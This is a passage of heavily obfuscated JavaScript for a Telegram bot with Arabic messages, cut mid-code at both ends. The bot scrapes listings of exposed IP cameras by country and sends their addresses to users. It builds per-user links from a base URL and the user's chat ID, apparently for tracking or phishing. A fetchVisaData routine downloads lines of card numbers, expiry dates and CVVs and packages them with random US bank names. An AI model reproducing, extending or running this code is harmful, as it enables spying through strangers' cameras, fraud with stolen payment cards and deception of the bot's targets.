    })[_0x3f4564(0x3d1)](_0x2e21e8 => {
        const _0x19a988 = _0x3f4564;
        console[_0x19a988(0x6d0)](_0x5c4742[_0x19a988(0x350)], _0x2e21e8[_0x19a988(0x246)] ? _0x2e21e8[_0x19a988(0x246)][_0x19a988(0x4d8)] : _0x2e21e8), _0x3784ca[_0x19a988(0x4e9)](-0x9f4 + 0xe04 + 0x12 * -0x1e)[_0x19a988(0x74b)](_0x5c4742[_0x19a988(0x668)]);
    });
}), app[_0x178009(0x344)](_0x178009(0x66d), (_0x24af5c, _0x22a8e6) => {
    const _0x590148 = _0x178009, _0x4d0f50 = {
            'KTzGm': _0x590148(0x749) + _0x590148(0x5a5) + _0x590148(0x229),
            'PwnhM': _0x590148(0x6df)
        }, _0x2bae38 = _0x24af5c[_0x590148(0x62d)][_0x590148(0x5cb)];
    if (!_0x2bae38)
        return _0x22a8e6[_0x590148(0x4e9)](0x5 * 0xd3 + 0x196b + -0x1bfa)[_0x590148(0x74b)](_0x4d0f50[_0x590148(0x6f1)]);
    _0x22a8e6[_0x590148(0x4c1)](path[_0x590148(0x2a7)](__dirname, _0x4d0f50[_0x590148(0x34b)]));
});
const countryTranslation = {
        'AF': _0x178009(0x3df) + _0x178009(0x62c),
        'AL': _0x178009(0x74e),
        'DZ': _0x178009(0x5cd),
        'AO': _0x178009(0x3ec),
        'AR': _0x178009(0x4c9) + _0x178009(0x3f3),
        'AM': _0x178009(0x62e),
        'AU': _0x178009(0x336),
        'AT': _0x178009(0x212),
        'AZ': _0x178009(0x1fa),
        'BH': _0x178009(0x3e6),
        'BD': _0x178009(0x584),
        'BY': _0x178009(0x432),
        'BE': _0x178009(0x601),
        'BZ': _0x178009(0x2f9),
        'BJ': _0x178009(0x7e4),
        'BO': _0x178009(0x72d),
        'BA': _0x178009(0x6ce) + _0x178009(0x2e1),
        'BW': _0x178009(0x371),
        'BR': _0x178009(0x46c),
        'BG': _0x178009(0x6eb),
        'BF': _0x178009(0x3d5) + _0x178009(0x2f6),
        'KH': _0x178009(0x315),
        'CM': _0x178009(0x265) + _0x178009(0x2f8),
        'CA': _0x178009(0x3d9),
        'CL': _0x178009(0x445),
        'CN': _0x178009(0x1e3),
        'CO': _0x178009(0x624),
        'CR': _0x178009(0x2ff) + _0x178009(0x68a),
        'HR': _0x178009(0x429),
        'CY': _0x178009(0x564),
        'CZ': _0x178009(0x3e2),
        'DK': _0x178009(0x65d),
        'EC': _0x178009(0x6fd) + _0x178009(0x669),
        'EG': _0x178009(0x813),
        'SV': _0x178009(0x49e) + _0x178009(0x7e0),
        'EE': _0x178009(0x75c),
        'ET': _0x178009(0x7fb),
        'FI': _0x178009(0x3e9),
        'FR': _0x178009(0x2e0),
        'GE': _0x178009(0x73a),
        'DE': _0x178009(0x326),
        'GH': _0x178009(0x75e),
        'GR': _0x178009(0x56f),
        'GT': _0x178009(0x57a) + _0x178009(0x629),
        'HN': _0x178009(0x62a),
        'HK': _0x178009(0x556) + _0x178009(0x606),
        'HU': _0x178009(0x45a),
        'IS': _0x178009(0x54e),
        'IN': _0x178009(0x1d5),
        'ID': _0x178009(0x7b4) + _0x178009(0x7b2),
        'IR': _0x178009(0x37a),
        'IQ': _0x178009(0x424),
        'IE': _0x178009(0x4de),
        'IL': _0x178009(0x617),
        'IT': _0x178009(0x5d1),
        'CI': _0x178009(0x4b7) + _0x178009(0x342),
        'JP': _0x178009(0x80f),
        'JO': _0x178009(0x73f),
        'KZ': _0x178009(0x73b) + _0x178009(0x3a8),
        'KE': _0x178009(0x247),
        'KW': _0x178009(0x1cf),
        'KG': _0x178009(0x67e) + _0x178009(0x6d3),
        'LV': _0x178009(0x461),
        'LB': _0x178009(0x241),
        'LY': _0x178009(0x759),
        'LT': _0x178009(0x2ea),
        'LU': _0x178009(0x474) + _0x178009(0x3f9),
        'MO': _0x178009(0x5ec),
        'MY': _0x178009(0x76b),
        'ML': _0x178009(0x472),
        'MT': _0x178009(0x32c),
        'MX': _0x178009(0x376),
        'MC': _0x178009(0x575),
        'MN': _0x178009(0x571),
        'ME': _0x178009(0x7ad) + _0x178009(0x1f5),
        'MA': _0x178009(0x48b),
        'MZ': _0x178009(0x3e8),
        'MM': _0x178009(0x24b),
        'NA': _0x178009(0x2c8),
        'NP': _0x178009(0x3ed),
        'NL': _0x178009(0x5ca),
        'NZ': _0x178009(0x6c4) + _0x178009(0x786),
        'NG': _0x178009(0x2c5),
        'KP': _0x178009(0x50b) + _0x178009(0x404),
        'NO': _0x178009(0x589),
        'OM': _0x178009(0x4fd),
        'PK': _0x178009(0x473),
        'PS': _0x178009(0x533),
        'PA': _0x178009(0x20e),
        'PY': _0x178009(0x545),
        'PE': _0x178009(0x292),
        'PH': _0x178009(0x3f4),
        'PL': _0x178009(0x7be),
        'PT': _0x178009(0x38c),
        'PR': _0x178009(0x7ba) + _0x178009(0x581),
        'QA': _0x178009(0x7a0),
        'RO': _0x178009(0x780),
        'RU': _0x178009(0x59e),
        'RW': _0x178009(0x22c),
        'SA': _0x178009(0x51e),
        'SN': _0x178009(0x7c2),
        'RS': _0x178009(0x782),
        'SG': _0x178009(0x775),
        'SK': _0x178009(0x3e1),
        'SI': _0x178009(0x716),
        'ZA': _0x178009(0x50c) + _0x178009(0x367),
        'KR': _0x178009(0x5b7) + _0x178009(0x2d7),
        'ES': _0x178009(0x2dd),
        'LK': _0x178009(0x55e),
        'SD': _0x178009(0x201),
        'SE': _0x178009(0x680),
        'CH': _0x178009(0x65a),
        'SY': _0x178009(0x4b8),
        'TW': _0x178009(0x51b),
        'TZ': _0x178009(0x5ea),
        'TH': _0x178009(0x6b4),
        'TG': _0x178009(0x5de),
        'TN': _0x178009(0x732),
        'TR': _0x178009(0x331),
        'TM': _0x178009(0x656) + _0x178009(0x7ee),
        'UG': _0x178009(0x220),
        'UA': _0x178009(0x22f),
        'AE': _0x178009(0x410),
        'GB': _0x178009(0x80a),
        'US': _0x178009(0x700),
        'UY': _0x178009(0x7ef),
        'UZ': _0x178009(0x3b4) + _0x178009(0x458),
        'VE': _0x178009(0x65f),
        'VN': _0x178009(0x40e),
        'ZM': _0x178009(0x27e),
        'ZW': _0x178009(0x3b8),
        'GL': _0x178009(0x30a),
        'KY': _0x178009(0x4cf) + _0x178009(0x531),
        'NI': _0x178009(0x52f) + _0x178009(0x4b5),
        'DO': _0x178009(0x26f) + _0x178009(0x667),
        'NC': _0x178009(0x26a) + _0x178009(0x409),
        'LA': _0x178009(0x520),
        'TT': _0x178009(0x50d) + _0x178009(0x37e),
        'GG': _0x178009(0x37b),
        'GU': _0x178009(0x7b6),
        'GP': _0x178009(0x4d7),
        'MG': _0x178009(0x740),
        'RE': _0x178009(0x31e),
        'FO': _0x178009(0x49a),
        'MD': _0x178009(0x2d2)
    }, camRequestCounts = {};
async function initStorage() {
    const _0x1f430d = _0x178009, _0x4985b9 = { 'VhTEs': _0x1f430d(0x4cd) };
    await storage[_0x1f430d(0x570)](), vipUsers = await storage[_0x1f430d(0x213)](_0x4985b9[_0x1f430d(0x52a)]) || [];
}
async function saveVipUsers() {
    const _0xf99404 = _0x178009, _0x23374b = { 'JTiBl': _0xf99404(0x4cd) };
    await storage[_0xf99404(0x5d3)](_0x23374b[_0xf99404(0x31f)], vipUsers);
}
function showCountryList(_0x56ee9c, _0x226d00 = 0x454 + -0x3 * 0x977 + -0x3d * -0x65) {
    const _0xcf00b = _0x178009, _0x51ad31 = {
            'yZAEZ': function (_0x3b8d27, _0x511535) {
                return _0x3b8d27 + _0x511535;
            },
            'BBIvU': function (_0x3d7ef0, _0x430eeb) {
                return _0x3d7ef0 < _0x430eeb;
            },
            'zOlAO': function (_0x4e0c81, _0x305f6a) {
                return _0x4e0c81 < _0x305f6a;
            },
            'dbXLq': function (_0x2647d9, _0x590c8b) {
                return _0x2647d9 + _0x590c8b;
            },
            'iZnqf': function (_0x442d4e, _0xa2ffa0) {
                return _0x442d4e > _0xa2ffa0;
            },
            'vqWfq': function (_0x523e52, _0x51f923) {
                return _0x523e52 < _0x51f923;
            },
            'ZWOdS': _0xcf00b(0x52e),
            'qJshk': _0xcf00b(0x2ed) + 'ة:'
        };
    try {
        const _0x375c64 = [], _0x242f25 = Object[_0xcf00b(0x7f2)](countryTranslation), _0x38b66b = Object[_0xcf00b(0x226)](countryTranslation), _0x4483af = Math[_0xcf00b(0x579)](_0x51ad31[_0xcf00b(0x340)](_0x226d00, 0x1 * 0x117c + -0x15b8 + 0x49f * 0x1), _0x242f25[_0xcf00b(0x20d)]);
        for (let _0x558c38 = _0x226d00; _0x51ad31[_0xcf00b(0x63d)](_0x558c38, _0x4483af); _0x558c38 += 0x923 * -0x1 + 0x818 + 0x10e) {
            const _0x31247a = [];
            for (let _0x3ac16a = _0x558c38; _0x51ad31[_0xcf00b(0x588)](_0x3ac16a, _0x51ad31[_0xcf00b(0x5d8)](_0x558c38, 0xa4c + -0x134e + 0x905)) && _0x51ad31[_0xcf00b(0x588)](_0x3ac16a, _0x4483af); _0x3ac16a++) {
                const _0x565d71 = _0x242f25[_0x3ac16a], _0x122349 = _0x38b66b[_0x3ac16a];
                _0x31247a[_0xcf00b(0x30d)]({
                    'text': _0x122349,
                    'callback_data': _0x565d71
                });
            }
            _0x375c64[_0xcf00b(0x30d)](_0x31247a);
        }
        const _0x22a71b = [];
        _0x51ad31[_0xcf00b(0x34e)](_0x226d00, 0x22b2 + -0x9b1 + -0x1901) && _0x22a71b[_0xcf00b(0x30d)], _0x51ad31[_0xcf00b(0x687)](_0x4483af, _0x242f25[_0xcf00b(0x20d)]) && _0x22a71b[_0xcf00b(0x30d)]({
            'text': _0x51ad31[_0xcf00b(0x59f)],
            'callback_data': _0xcf00b(0x3ba) + _0x4483af
        }), _0x22a71b[_0xcf00b(0x20d)] && _0x375c64[_0xcf00b(0x30d)](_0x22a71b), bot[_0xcf00b(0x273) + 'e'](_0x56ee9c, _0x51ad31[_0xcf00b(0x57f)], { 'reply_markup': { 'inline_keyboard': _0x375c64 } });
    } catch (_0x5a8b0e) {
        bot[_0xcf00b(0x273) + 'e'](_0x56ee9c, _0xcf00b(0x7f5) + _0xcf00b(0x2fa) + _0xcf00b(0x540) + _0x5a8b0e[_0xcf00b(0x1e6)]);
    }
}
async function displayCameras(_0x25bf09, _0x525443) {
    const _0x58b3e7 = _0x178009, _0x145ccb = {
            'vmwgz': _0x58b3e7(0x549) + _0x58b3e7(0x1dd) + _0x58b3e7(0x748),
            'uyPaN': function (_0x2b3c6f, _0x39a472) {
                return _0x2b3c6f < _0x39a472;
            },
            'CxECQ': function (_0x3ffa9d, _0x2f851e) {
                return _0x3ffa9d % _0x2f851e;
            },
            'kCTbX': _0x58b3e7(0x266) + _0x58b3e7(0x602) + _0x58b3e7(0x739) + _0x58b3e7(0x6dc) + _0x58b3e7(0x243) + _0x58b3e7(0x25c) + _0x58b3e7(0x5fc) + _0x58b3e7(0x7cc) + _0x58b3e7(0x210) + _0x58b3e7(0x5d2) + _0x58b3e7(0x59a) + '6',
            'wADxn': _0x58b3e7(0x7bc) + _0x58b3e7(0x66c) + _0x58b3e7(0x477) + _0x58b3e7(0x5a9) + _0x58b3e7(0x7d7) + _0x58b3e7(0x3a9) + _0x58b3e7(0x729) + _0x58b3e7(0x4ee) + _0x58b3e7(0x454) + _0x58b3e7(0x78e),
            'IRhzb': function (_0xd3ac23, _0x2e1634, _0x1cae33) {
                return _0xd3ac23(_0x2e1634, _0x1cae33);
            },
            'UBwKN': function (_0x115a3b, _0x14dd3a) {
                return _0x115a3b <= _0x14dd3a;
            },
            'mcOiZ': function (_0x3bce3b, _0x99b4e2) {
                return _0x3bce3b < _0x99b4e2;
            },
            'pFvqx': function (_0xb7cd4f, _0x4c5528) {
                return _0xb7cd4f + _0x4c5528;
            },
            'dArFo': _0x58b3e7(0x208) + _0x58b3e7(0x66c) + _0x58b3e7(0x477) + _0x58b3e7(0x365) + _0x58b3e7(0x53d) + _0x58b3e7(0x790) + _0x58b3e7(0x4cc) + _0x58b3e7(0x5c0) + _0x58b3e7(0x42b) + _0x58b3e7(0x51a) + _0x58b3e7(0x52d) + _0x58b3e7(0x422) + _0x58b3e7(0x6f4) + _0x58b3e7(0x231) + _0x58b3e7(0x5ae) + _0x58b3e7(0x469) + _0x58b3e7(0x5c4) + _0x58b3e7(0x7d0) + _0x58b3e7(0x423),
            'geZJA': _0x58b3e7(0x7bc) + _0x58b3e7(0x66c) + _0x58b3e7(0x477) + _0x58b3e7(0x5a9) + _0x58b3e7(0x7d7) + _0x58b3e7(0x6d8) + _0x58b3e7(0x491) + _0x58b3e7(0x803) + _0x58b3e7(0x43c) + _0x58b3e7(0x6a8)
        };
    try {
        const _0x35445d = await bot[_0x58b3e7(0x273) + 'e'](_0x25bf09, _0x145ccb[_0x58b3e7(0x5f9)]), _0xdbb44c = _0x35445d[_0x58b3e7(0x792)];
        for (let _0x2ee8f3 = -0x3 * -0x5dd + 0x75e + -0x1 * 0x18f5; _0x145ccb[_0x58b3e7(0x3d0)](_0x2ee8f3, -0x1c8b * 0x1 + -0x174a + -0xcf9 * -0x4); _0x2ee8f3++) {
            await bot[_0x58b3e7(0x5cf) + _0x58b3e7(0x22a)](_0x58b3e7(0x549) + _0x58b3e7(0x1dd) + _0x58b3e7(0x206) + '.'[_0x58b3e7(0x4b4)](_0x145ccb[_0x58b3e7(0x41d)](_0x2ee8f3, -0x4c7 * -0x7 + -0x1844 * -0x1 + -0x39b1)), {
                'chat_id': _0x25bf09,
                'message_id': _0xdbb44c
            }), await new Promise(_0x1da8b3 => setTimeout(_0x1da8b3, 0x18f5 * 0x1 + -0xe9 * -0x26 + -0x1 * 0x37a3));
        }
        const _0x272b58 = _0x58b3e7(0x4fe) + _0x58b3e7(0x3ad) + _0x58b3e7(0x4c0) + _0x58b3e7(0x711) + _0x525443, _0x18cd40 = { 'User-Agent': _0x145ccb[_0x58b3e7(0x79d)] };
        let _0x137886 = await axios[_0x58b3e7(0x344)](_0x272b58, { 'headers': _0x18cd40 });
        const _0x480604 = _0x137886[_0x58b3e7(0x320)][_0x58b3e7(0x42d)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0x480604) {
            bot[_0x58b3e7(0x273) + 'e'](_0x25bf09, _0x145ccb[_0x58b3e7(0x550)]);
            return;
        }
        const _0x536ab3 = _0x145ccb[_0x58b3e7(0x26c)](parseInt, _0x480604[0x1860 * 0x1 + -0x9 * 0x1b1 + -0x926], 0xb7 * 0x2d + -0x4 * 0x7f4 + -0x51), _0x4faab4 = [];
        for (let _0x30dad2 = 0x772 + 0x1 * 0x1a15 + 0x265 * -0xe; _0x145ccb[_0x58b3e7(0x498)](_0x30dad2, _0x536ab3); _0x30dad2++) {
            _0x137886 = await axios[_0x58b3e7(0x344)](_0x272b58 + _0x58b3e7(0x4b2) + _0x30dad2, { 'headers': _0x18cd40 });
            const _0x4209f3 = _0x137886[_0x58b3e7(0x320)][_0x58b3e7(0x42d)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x4faab4[_0x58b3e7(0x30d)](..._0x4209f3);
        }
        if (_0x4faab4[_0x58b3e7(0x20d)]) {
            const _0x2bd305 = _0x4faab4[_0x58b3e7(0x552)]((_0x3e994f, _0x240ab2) => _0x240ab2 + (0x5 * -0x524 + 0x2180 + 0x39 * -0x23) + '.\x20' + _0x3e994f);
            for (let _0x475850 = -0x13b2 + -0x2 * 0x130d + 0x112 * 0x36; _0x145ccb[_0x58b3e7(0x281)](_0x475850, _0x2bd305[_0x58b3e7(0x20d)]); _0x475850 += -0x232a + 0x1003 * 0x2 + 0x356) {
                const _0x13ba1f = _0x2bd305[_0x58b3e7(0x3aa)](_0x475850, _0x145ccb[_0x58b3e7(0x5f6)](_0x475850, 0x2bd * -0x7 + -0xc1f * -0x2 + 0x1 * -0x4e1));
                await bot[_0x58b3e7(0x273) + 'e'](_0x25bf09, _0x13ba1f[_0x58b3e7(0x2a7)]('\x0a'));
            }
            await bot[_0x58b3e7(0x273) + 'e'](_0x25bf09, _0x145ccb[_0x58b3e7(0x516)]);
        } else
            await bot[_0x58b3e7(0x273) + 'e'](_0x25bf09, _0x145ccb[_0x58b3e7(0x387)]);
    } catch (_0x2d6e7d) {
        await bot[_0x58b3e7(0x273) + 'e'](_0x25bf09, _0x58b3e7(0x7bc) + _0x58b3e7(0x66c) + _0x58b3e7(0x477) + _0x58b3e7(0x5a9) + _0x58b3e7(0x7d7) + _0x58b3e7(0x6d8) + _0x58b3e7(0x491) + _0x58b3e7(0x803) + _0x58b3e7(0x43c) + _0x58b3e7(0x6a8));
    }
}
function isDeveloper(_0x147013) {
    const _0x4d7bb8 = _0x178009, _0x13a124 = {
            'GBtWn': function (_0x14254c, _0x3f73f8) {
                return _0x14254c === _0x3f73f8;
            }
        }, _0x292d00 = 0x1 * -0x1802108e7 + 0x4848896 * -0x29 + -0x9 * -0x65451f2f;
    return _0x13a124[_0x4d7bb8(0x603)](_0x147013, _0x292d00);
}
function showAdminPanel(_0x2f97f3) {
    const _0x1e8ad2 = _0x178009, _0x3a2d07 = {
            'lPQTV': _0x1e8ad2(0x3db) + 'م:',
            'BDKEd': _0x1e8ad2(0x5a0) + _0x1e8ad2(0x4e2),
            'EktCn': _0x1e8ad2(0x7eb),
            'djqDG': _0x1e8ad2(0x3c7) + _0x1e8ad2(0x4e2),
            'iBtAu': _0x1e8ad2(0x418)
        };
    bot[_0x1e8ad2(0x273) + 'e'](_0x2f97f3, _0x3a2d07[_0x1e8ad2(0x7c9)], {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x3a2d07[_0x1e8ad2(0x42c)],
                        'callback_data': _0x3a2d07[_0x1e8ad2(0x5f8)]
                    }],
                [{
                        'text': _0x3a2d07[_0x1e8ad2(0x67f)],
                        'callback_data': _0x3a2d07[_0x1e8ad2(0x47f)]
                    }]
            ]
        }
    });
}
bot[_0x178009(0x645)](/\/jjjjjavayy/, _0x3ce97a => {
    const _0x29422b = _0x178009, _0x5fcd1c = {
            'rZIek': _0x29422b(0x750) + _0x29422b(0x2b3) + _0x29422b(0x47b) + _0x29422b(0x2a9) + _0x29422b(0x747),
            'INXlI': _0x29422b(0x32d) + 'ي',
            'nRhaq': _0x29422b(0x4d9),
            'FQmpM': _0x29422b(0x20b) + _0x29422b(0x394),
            'PwjmT': _0x29422b(0x71c) + 're',
            'FGmah': _0x29422b(0x280) + 'ء',
            'DCbhw': _0x29422b(0x63e)
        }, _0xb6b0e9 = _0x3ce97a[_0x29422b(0x6a6)]['id'], _0x239172 = _0x5fcd1c[_0x29422b(0x4d2)];
    bot[_0x29422b(0x273) + 'e'](_0xb6b0e9, _0x239172, {
        'reply_markup': {
            'inline_keyboard': [
                [{
                        'text': _0x5fcd1c[_0x29422b(0x43d)],
                        'callback_data': _0x5fcd1c[_0x29422b(0x379)]
                    }],
                [{
                        'text': _0x5fcd1c[_0x29422b(0x4a9)],
                        'callback_data': _0x5fcd1c[_0x29422b(0x1f8)]
                    }],
                [{
                        'text': _0x5fcd1c[_0x29422b(0x349)],
                        'callback_data': _0x5fcd1c[_0x29422b(0x6b2)]
                    }]
            ]
        }
    });
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), _0x4f492d => {
    const _0x14639a = _0x178009, _0x3a7554 = {
            'PPsxN': function (_0x2b74d6, _0x196401) {
                return _0x2b74d6 === _0x196401;
            },
            'TwSAm': _0x14639a(0x4d9),
            'JUDXs': _0x14639a(0x71c) + 're',
            'xMnpk': function (_0x8b2472, _0x5ae6d5) {
                return _0x8b2472 === _0x5ae6d5;
            },
            'TVHFK': _0x14639a(0x63e),
            'gexsx': _0x14639a(0x6c1) + _0x14639a(0x7e7) + '\x20✅',
            'dwTrJ': function (_0x336a13, _0x11eee4) {
                return _0x336a13 === _0x11eee4;
            },
            'FajMB': _0x14639a(0x343)
        }, _0x17dfbc = _0x4f492d[_0x14639a(0x1e6)][_0x14639a(0x6a6)]['id'];
    let _0x2b1be4;
    if (_0x3a7554[_0x14639a(0x368)](_0x4f492d[_0x14639a(0x320)], _0x3a7554[_0x14639a(0x690)]))
        _0x2b1be4 = baseUrl + (_0x14639a(0x427) + _0x14639a(0x74c)) + _0x17dfbc + _0x14639a(0x697);
    else {
        if (_0x3a7554[_0x14639a(0x368)](_0x4f492d[_0x14639a(0x320)], _0x3a7554[_0x14639a(0x3bd)]))
            _0x2b1be4 = baseUrl + (_0x14639a(0x205) + _0x14639a(0x74c)) + _0x17dfbc + _0x14639a(0x697);
        else
            _0x3a7554[_0x14639a(0x699)](_0x4f492d[_0x14639a(0x320)], _0x3a7554[_0x14639a(0x40f)]) && (_0x2b1be4 = baseUrl + (_0x14639a(0x330) + _0x14639a(0x74c)) + _0x17dfbc + _0x14639a(0x697));
    }
    if (_0x2b1be4)
        bot[_0x14639a(0x273) + 'e'](_0x17dfbc, _0x14639a(0x5f3) + _0x14639a(0x360) + _0x2b1be4), bot[_0x14639a(0x3fa) + _0x14639a(0x21a)](_0x4f492d['id'], { 'text': _0x3a7554[_0x14639a(0x6ef)] });
    else
        _0x3a7554[_0x14639a(0x6b9)](_0x4f492d[_0x14639a(0x320)], _0x3a7554[_0x14639a(0x298)]) && (bot[_0x14639a(0x273) + 'e'](_0x17dfbc, _0x14639a(0x2a2) + _0x14639a(0x232) + _0x14639a(0x7e6) + _0x14639a(0x5d0) + _0x14639a(0x2eb) + _0x14639a(0x53f) + _0x14639a(0x72b) + 'ip'), bot[_0x14639a(0x3fa) + _0x14639a(0x21a)](_0x4f492d['id'], { 'text': '' }));
}), bot[_0x178009(0x645)](/\/نننطسطوو/, _0x2768f4 => {
    const _0x55efda = _0x178009, _0x175ad9 = {
            'LFQwe': _0x55efda(0x4ad) + _0x55efda(0x618) + _0x55efda(0x464) + _0x55efda(0x301),
            'JYqSX': _0x55efda(0x4d0) + _0x55efda(0x397),
            'eWHUj': _0x55efda(0x6a5) + 's',
            'saEtt': function (_0xe1ef73, _0x45836a) {
                return _0xe1ef73(_0x45836a);
            }
        }, _0x39dfe2 = _0x2768f4[_0x55efda(0x6a6)]['id'];
    bot[_0x55efda(0x273) + 'e'](_0x39dfe2, _0x175ad9[_0x55efda(0x38f)], {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x175ad9[_0x55efda(0x5e0)],
                        'callback_data': _0x175ad9[_0x55efda(0x1f3)]
                    }]]
        }
    }), _0x175ad9[_0x55efda(0x3fc)](isDeveloper, _0x39dfe2) && _0x175ad9[_0x55efda(0x3fc)](showAdminPanel, _0x39dfe2);
}), bot['on'](_0x178009(0x459) + _0x178009(0x679), async _0x490494 => {
    const _0x32a118 = _0x178009, _0x2db23c = {
            'Xmmfg': function (_0x111199, _0x22c073) {
                return _0x111199 === _0x22c073;
            },
            'XyMxt': _0x32a118(0x6a5) + 's',
            'uTCtX': function (_0x3e11bf, _0x1d8a9d) {
                return _0x3e11bf(_0x1d8a9d);
            },
            'euhBL': function (_0x432ac8, _0x2ff80a) {
                return _0x432ac8 in _0x2ff80a;
            },
            'XmvzN': function (_0xe166a8, _0x1247d6, _0x4b0c97) {
                return _0xe166a8(_0x1247d6, _0x4b0c97);
            },
            'mFEMc': _0x32a118(0x3ba),
            'sQjOR': _0x32a118(0x222),
            'FnKca': function (_0xef0d49, _0x16edd2, _0x5e5403) {
                return _0xef0d49(_0x16edd2, _0x5e5403);
            },
            'HKFWO': function (_0x372d5b, _0x4d6848) {
                return _0x372d5b - _0x4d6848;
            }
        }, _0x186af0 = _0x490494[_0x32a118(0x1e6)][_0x32a118(0x6a6)]['id'];
    if (_0x2db23c[_0x32a118(0x390)](_0x490494[_0x32a118(0x320)], _0x2db23c[_0x32a118(0x4eb)]))
        _0x2db23c[_0x32a118(0x760)](showCountryList, _0x186af0);
    else {
        if (_0x2db23c[_0x32a118(0x708)](_0x490494[_0x32a118(0x320)], countryTranslation))
            bot[_0x32a118(0x24f) + _0x32a118(0x7bb)](_0x186af0, _0x490494[_0x32a118(0x1e6)][_0x32a118(0x792)]), _0x2db23c[_0x32a118(0x5b4)](displayCameras, _0x186af0, _0x490494[_0x32a118(0x320)]);
        else {
            if (_0x490494[_0x32a118(0x320)][_0x32a118(0x1ec)](_0x2db23c[_0x32a118(0x60e)])) {
                const _0x28f67c = _0x2db23c[_0x32a118(0x5b4)](parseInt, _0x490494[_0x32a118(0x320)][_0x32a118(0x577)]('_')[-0x3 * -0x8c7 + -0xce1 + -0xd73], -0x733 * -0x1 + -0x25e0 + 0x1eb7);
                bot[_0x32a118(0x24f) + _0x32a118(0x7bb)](_0x186af0, _0x490494[_0x32a118(0x1e6)][_0x32a118(0x792)]), _0x2db23c[_0x32a118(0x5b4)](showCountryList, _0x186af0, _0x28f67c);
            } else {
                if (_0x490494[_0x32a118(0x320)][_0x32a118(0x1ec)](_0x2db23c[_0x32a118(0x585)])) {
                    const _0x5725a1 = _0x2db23c[_0x32a118(0x2a0)](parseInt, _0x490494[_0x32a118(0x320)][_0x32a118(0x577)]('_')[0x731 + -0x1735 + -0x3 * -0x557], 0x1fff + -0x1c5e + -0x1 * 0x397), _0x2b1193 = Math[_0x32a118(0x449)](-0x1 * 0x1b6f + -0x173 * 0x2 + -0x611 * -0x5, _0x2db23c[_0x32a118(0x335)](_0x5725a1, 0x1 * 0x677 + -0x1fd * 0xb + 0xf7a));
                    bot[_0x32a118(0x24f) + _0x32a118(0x7bb)](_0x186af0, _0x490494[_0x32a118(0x1e6)][_0x32a118(0x792)]), _0x2db23c[_0x32a118(0x2a0)](showCountryList, _0x186af0, _0x2b1193);
                }
            }
        }
    }
});
const americanBanks = [
        _0x178009(0x3e7) + _0x178009(0x386),
        _0x178009(0x526),
        _0x178009(0x3dc),
        _0x178009(0x66a) + 'o',
        _0x178009(0x5b2) + 'e',
        _0x178009(0x434),
        _0x178009(0x6bd),
        _0x178009(0x583),
        _0x178009(0x442) + _0x178009(0x23a),
        _0x178009(0x450) + _0x178009(0x1d3)
    ], fetchVisaData = async () => {
        const _0x2ae685 = _0x178009, _0x491017 = {
                'zgWap': function (_0x11525f, _0x3bef8d) {
                    return _0x11525f === _0x3bef8d;
                },
                'DEDNn': function (_0x4d2ef5, _0x4a2e19) {
                    return _0x4d2ef5 * _0x4a2e19;
                },
                'CldDh': _0x2ae685(0x359) + _0x2ae685(0x55b) + _0x2ae685(0x295),
                'EFcNx': _0x2ae685(0x5d4),
                'csaNa': function (_0x1ba298, _0xe2d963) {
                    return _0x1ba298 + _0xe2d963;
                },
                'nHxgK': _0x2ae685(0x58e) + _0x2ae685(0x651) + _0x2ae685(0x2af) + 'p/',
                'oHtNb': function (_0x3e52f5, _0x293ae0) {
                    return _0x3e52f5 > _0x293ae0;
                },
                'woTVk': function (_0x3b9462, _0x1aadc7) {
                    return _0x3b9462 > _0x1aadc7;
                },
                'rDNIm': _0x2ae685(0x4df) + _0x2ae685(0x650) + _0x2ae685(0x202) + _0x2ae685(0x27b) + _0x2ae685(0x6ea) + _0x2ae685(0x3f5),
                'aYjKf': _0x2ae685(0x321) + _0x2ae685(0x236)
            };
        try {
            const _0x529495 = _0x491017[_0x2ae685(0x217)], _0xb6a5e3 = await axios[_0x2ae685(0x344)](_0x529495), _0x56b593 = _0xb6a5e3[_0x2ae685(0x320)], _0x1aa1ff = _0x56b593[_0x2ae685(0x6f0)]()[_0x2ae685(0x577)]('\x0a');
            if (_0x491017[_0x2ae685(0x36c)](_0x1aa1ff[_0x2ae685(0x20d)], -0x539 + -0x1864 + 0x1d9d)) {
                const _0x222e00 = _0x1aa1ff[_0x2ae685(0x552)](_0x325e68 => {
                    const _0x3824ad = _0x2ae685, _0x50404d = _0x325e68[_0x3824ad(0x577)]('|');
                    if (_0x491017[_0x3824ad(0x2d3)](_0x50404d[_0x3824ad(0x20d)], -0x144d * 0x1 + -0x4b * 0x7f + 0x18e * 0x25))
                        return {
                            'CardNumber': _0x50404d[-0x1baa + 0x12b0 + 0x8fa],
                            'Expiry': _0x50404d[-0x44c + -0x128 * 0x1b + -0xbd7 * -0x3] + '/' + _0x50404d[0x51b * 0x3 + -0x1072 + 0x123],
                            'CVV': _0x50404d[-0xd8e + -0x457 * -0x1 + -0x2 * -0x49d],
                            'Bank': americanBanks[Math[_0x3824ad(0x5e9)](_0x491017[_0x3824ad(0x807)](Math[_0x3824ad(0x358)](), americanBanks[_0x3824ad(0x20d)]))],
                            'CardType': _0x491017[_0x3824ad(0x71f)],
                            'Country': _0x491017[_0x3824ad(0x637)],
                            'Value': '$' + _0x491017[_0x3824ad(0x6f8)](Math[_0x3824ad(0x5e9)](_0x491017[_0x3824ad(0x807)](Math[_0x3824ad(0x358)](), -0x22 * 0xb3 + -0x1 * -0x1a2f + -0x24a)), 0x1ab7 * 0x1 + -0x22f5 + 0x848)
                        };
                })[_0x2ae685(0x3a6)](Boolean);
                if (_0x491017[_0x2ae685(0x5e3)](_0x222e00[_0x2ae685(0x20d)], 0x1121 + 0x7 * 0x382 + -0x29af))
                    return _0x222e00[Math[_0x2ae685(0x5e9)](_0x491017[_0x2ae685(0x807)](Math[_0x2ae685(0x358)](), _0x222e00[_0x2ae685(0x20d)]))];
            }
            return console[_0x2ae685(0x22e)](_0x491017[_0x2ae685(0x561)]), null;
        } catch (_0x46175d) {
            return console[_0x2ae685(0x22e)](_0x491017[_0x2ae685(0x3a2)], _0x46175d[_0x2ae685(0x1e6)]), null;
        }
    };
bot[_0x178009(0x645)](/\/نكخمنتته/, _0xda00e9 => {
    const _0x48cb87 = _0x178009, _0xecbb5f = {
            'XzFvK': _0x48cb87(0x632) + _0x48cb87(0x375),
            'UcuLl': _0x48cb87(0x440) + _0x48cb87(0x375),
